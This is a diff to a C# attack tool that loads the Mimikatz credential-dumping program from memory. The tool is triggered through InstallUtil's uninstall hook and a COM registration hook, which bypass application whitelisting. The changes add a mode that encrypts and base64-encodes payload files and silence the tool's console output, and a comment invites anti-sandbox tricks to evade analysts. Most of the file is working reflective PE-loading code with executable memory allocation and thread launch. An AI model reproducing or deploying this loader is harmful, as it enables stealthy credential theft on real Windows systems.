@@ -44,31 +44,41 @@ C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /U katz.exe
 */
 
 
+// Find/Replace All "password"
+// Find "SALT" and update those bytes
 
 namespace Delivery
 {
 
     public class Program
     {
-        public static void Main()
+        public static void Main(string[] args)
         {
-            Console.WriteLine("Hello From Main...I Don't Do Anything");
-            //Add any behaviour here to throw off sandbox execution/analysts :)
-            Katz.Exec();
+            if(args.Length == 2) {
+                if(args[0] == "encrypt") {
+                    String file = args[1];
 
-            /*
-			//Example Extract Files and Encrypt.  Ideally you would compress.  But .NET 2 doesn't have really good Compression Libraries..
-            byte[] b  = Misc.FileToByteArray(@"mimikatz.exe");
-            byte[] e = Misc.Encrypt(b,"password");
-            string f = System.Convert.ToBase64String(e);
-            File.WriteAllText(@"file.b64",f);
-            
-			byte[] b1  = Misc.FileToByteArray(@"mimikatzx86.exe");
-            byte[] e1 = Misc.Encrypt(b1,"password");
-            string f1 = System.Convert.ToBase64String(e1);
-            File.WriteAllText(@"filex86.b64",f1);
+                    //Example Extract Files and Encrypt.  Ideally you would compress.  But .NET 2 doesn't have really good Compression Libraries..
+                    //byte[] b  = Misc.FileToByteArray(@"mimikatz64.exe");
+                    byte[] b  = Misc.FileToByteArray(@file);
+                    byte[] e = Misc.Encrypt(b,"password");
+                    string f = System.Convert.ToBase64String(e);
+                    File.WriteAllText(@"file.b64",f);
+                    Console.WriteLine("{0}", f);
+
+                    /*
+                    byte[] b1  = Misc.FileToByteArray(@"mimikatzx86.exe");
+                    byte[] e1 = Misc.Encrypt(b1,"password");
+                    string f1 = System.Convert.ToBase64String(e1);
+                    File.WriteAllText(@"filex86.b64",f1);
 			*/
-			
+
+                }
+            else {
+                //Add any behaviour here to throw off sandbox execution/analysts :)
+                Katz.Exec();
+
+            }
 
         }
 
@@ -82,7 +92,7 @@ namespace Delivery
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
 
-            Console.WriteLine("Hello There From Uninstall");
+            //Console.WriteLine("Hello There From Uninstall");
             Katz.Exec();
 
         }
@@ -91,7 +101,7 @@ namespace Delivery
 
     public class Bypass : ServicedComponent
     {
-        public Bypass() { Console.WriteLine("I am a basic COM Object"); }
+        public Bypass() { //Console.WriteLine("I am a basic COM Object"); }
 
         [ComRegisterFunction] //This executes if registration is successful
         public static void RegisterClass(string key)
@@ -149,12 +159,12 @@ namespace Delivery
             {
                 while (ex != null)
                 {
-                    Console.WriteLine(ex.Message);
+                    //Console.WriteLine(ex.Message);
                     ex = ex.InnerException;
                 }
             }
 
-            Console.WriteLine("Downloaded Latest");
+            //Console.WriteLine("Downloaded Latest");
             PELoader pe = new PELoader(latestMimikatz);
 
 
@@ -163,15 +173,15 @@ namespace Delivery
 
             if (pe.Is32BitHeader)
             {
-                Console.WriteLine("Preferred Load Address = {0}", pe.OptionalHeader32.ImageBase.ToString("X4"));
+                //Console.WriteLine("Preferred Load Address = {0}", pe.OptionalHeader32.ImageBase.ToString("X4"));
                 codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, pe.OptionalHeader32.SizeOfImage, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
-                Console.WriteLine("Allocated Space For {0} at {1}", pe.OptionalHeader32.SizeOfImage.ToString("X4"), codebase.ToString("X4"));
+                //Console.WriteLine("Allocated Space For {0} at {1}", pe.OptionalHeader32.SizeOfImage.ToString("X4"), codebase.ToString("X4"));
             }
             else
             {
-                Console.WriteLine("Preferred Load Address = {0}", pe.OptionalHeader64.ImageBase.ToString("X4"));
+                //Console.WriteLine("Preferred Load Address = {0}", pe.OptionalHeader64.ImageBase.ToString("X4"));
                 codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, pe.OptionalHeader64.SizeOfImage, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
-                Console.WriteLine("Allocated Space For {0} at {1}", pe.OptionalHeader64.SizeOfImage.ToString("X4"), codebase.ToString("X4"));
+                //Console.WriteLine("Allocated Space For {0} at {1}", pe.OptionalHeader64.SizeOfImage.ToString("X4"), codebase.ToString("X4"));
             }
 
 
@@ -182,7 +192,7 @@ namespace Delivery
 
                 IntPtr y = NativeDeclarations.VirtualAlloc(IntPtrAdd(codebase, (int)pe.ImageSectionHeaders[i].VirtualAddress), pe.ImageSectionHeaders[i].SizeOfRawData, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
                 Marshal.Copy(pe.RawBytes, (int)pe.ImageSectionHeaders[i].PointerToRawData, y, (int)pe.ImageSectionHeaders[i].SizeOfRawData);
-                Console.WriteLine("Section {0}, Copied To {1}", new string(pe.ImageSectionHeaders[i].Name), y.ToString("X4"));
+                //Console.WriteLine("Section {0}, Copied To {1}", new string(pe.ImageSectionHeaders[i].Name), y.ToString("X4"));
             }
 
             //Perform Base Relocation
@@ -200,7 +210,7 @@ namespace Delivery
                 delta = (long)(currentbase.ToInt64() - (long)pe.OptionalHeader64.ImageBase);
             }
 
-            Console.WriteLine("Delta = {0}", delta.ToString("X4"));
+            //Console.WriteLine("Delta = {0}", delta.ToString("X4"));
 
             //Modify Memory Based On Relocation Table
             IntPtr relocationTable;
@@ -311,7 +321,7 @@ namespace Delivery
                     if (DllName == "") { break; }
 
                     IntPtr handle = NativeDeclarations.LoadLibrary(DllName);
-                    Console.WriteLine("Loaded {0}", DllName);
+                    //Console.WriteLine("Loaded {0}", DllName);
                     int k = 0;
                     while (true)
                     {
@@ -326,12 +336,12 @@ namespace Delivery
                     j++;
                 }
                 //Transfer Control To OEP
-                Console.WriteLine("Executing Mimikatz");
+                //Console.WriteLine("Executing Mimikatz");
                 threadStart = IntPtrAdd(codebase, (int)pe.OptionalHeader32.AddressOfEntryPoint);
                 hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
                 NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);
 
-                Console.WriteLine("Thread Complete");
+                //Console.WriteLine("Thread Complete");
             }
             else
             {
@@ -346,13 +356,13 @@ namespace Delivery
                     if (DllName == "") { break; }
 
                     IntPtr handle = NativeDeclarations.LoadLibrary(DllName);
-                    Console.WriteLine("Loaded {0}", DllName);
+                    //Console.WriteLine("Loaded {0}", DllName);
                     int k = 0;
                     while (true)
                     {
                         IntPtr dllFuncNamePTR = (IntPtrAdd(codebase, Marshal.ReadInt32(a2)));
                         string DllFuncName = Marshal.PtrToStringAnsi(IntPtrAdd(dllFuncNamePTR, 2));
-                        //Console.WriteLine("Function {0}", DllFuncName);
+                        ////Console.WriteLine("Function {0}", DllFuncName);
                         IntPtr funcAddy = NativeDeclarations.GetProcAddress(handle, DllFuncName);
                         Marshal.WriteInt64(a2, (long)funcAddy);
                         a2 = IntPtrAdd(a2, 8);
@@ -362,17 +372,17 @@ namespace Delivery
                     j++;
                 }
                 //Transfer Control To OEP
-                Console.WriteLine("Executing Mimikatz");
+                //Console.WriteLine("Executing Mimikatz");
                 threadStart = IntPtrAdd(codebase, (int)pe.OptionalHeader64.AddressOfEntryPoint);
                 hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
                 NativeDeclarations.WaitForSingleObject(hThread, 0xFFFFFFFF);
 
-                Console.WriteLine("Thread Complete");
+                //Console.WriteLine("Thread Complete");
             }
 
             //Transfer Control To OEP
 
-            Console.WriteLine("Thread Complete");
+            //Console.WriteLine("Thread Complete");
             //Console.ReadLine();
 
 
@@ -829,7 +839,7 @@ namespace Delivery
 
             fileStream.Write(file, 0, file.Length);//Write stream to temp file
 
-            Console.WriteLine("File Ready, Now Deliver Payload");
+            //Console.WriteLine("File Ready, Now Deliver Payload");
 
         }
 
@@ -893,9 +903,8 @@ namespace Delivery
 
     public class Package
     {
-        //Latest As Of 12/31/2015
-        public static string filex86 = @"[INSERT FILE HERE]";
-        public static string filex64 = @"[INSERT FILE HERE]";
+        public static string filex86 = @"INSERT B64 HERE";
+        public static string filex64 = @"INSERT B64 HERE";
         
 	}
 }
